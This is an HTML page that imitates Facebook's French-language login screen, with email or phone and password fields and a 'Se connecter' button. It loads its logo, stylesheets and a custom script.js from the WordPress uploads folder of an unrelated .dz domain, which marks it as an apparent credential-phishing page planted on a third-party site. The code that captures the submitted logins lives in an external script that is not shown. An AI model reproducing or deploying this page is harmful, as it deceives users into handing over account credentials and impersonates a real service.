<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Connexion ou inscription</title>
    <link rel="icon" href="https://www.pantoneprod.dz/wp-content/uploads/assets/images/favicon.ico">
    <link rel="stylesheet" href="https://www.pantoneprod.dz/wp-content/uploads/assets/dist/css/style.css" />
    <link href="https://www.pantoneprod.dz/wp-content/uploads/assets/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="https://www.pantoneprod.dz/wp-content/uploads/assets/dist/css/bootstrap-icons.css" />
</head>

<body>
    <section>
        <div class="container">


            <div class="fb-text">
                <img src="https://www.pantoneprod.dz/wp-content/uploads/assets/images/facebooklogo.svg" alt="Facebook">
                <h2>Avec Facebook, partagez et restez en<br>contact avec votre entourage.</h2>
            </div>

            <div class="fb-login">
                <form action="#">
                    <input type="text" name="login" id="login" placeholder="Adresse e-mail ou numéro de tél.">
                    <input type="Mot de passe" name="Mot de passe" id="password" placeholder="Mot de passe">
                    <i class="bi bi-eye-slash" id="togglePassword"></i>
                    <button id="btn-login">Se connecter</button>
                    <span class="forgotten-password" id="txt-forgotten-password"><a href="#">Mot de passe oublié ?</a></span>

                    <hr>

                    <button id="btn-new-account">Créer nouveau compte</button>
                </form>

                <p id="txt-create-page"><a href="#" id="create-page-link">Créer une Page</a>  pour une célébrité, une marque ou une entreprise.</p>
            </div>
        </div>


        <script src="https://www.pantoneprod.dz/wp-content/uploads/assets/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
            crossorigin="anonymous"></script>
        <script src="https://www.pantoneprod.dz/wp-content/uploads/assets/dist/js/popper.min.js"
            integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
            crossorigin="anonymous"></script>
        <script src="https://www.pantoneprod.dz/wp-content/uploads/assets/dist/js/bootstrap.min.js"
            integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
            crossorigin="anonymous"></script>
        <script src="https://www.pantoneprod.dz/wp-content/uploads/assets/dist/js/script.js"></script>
    </section>

</body>
</html>
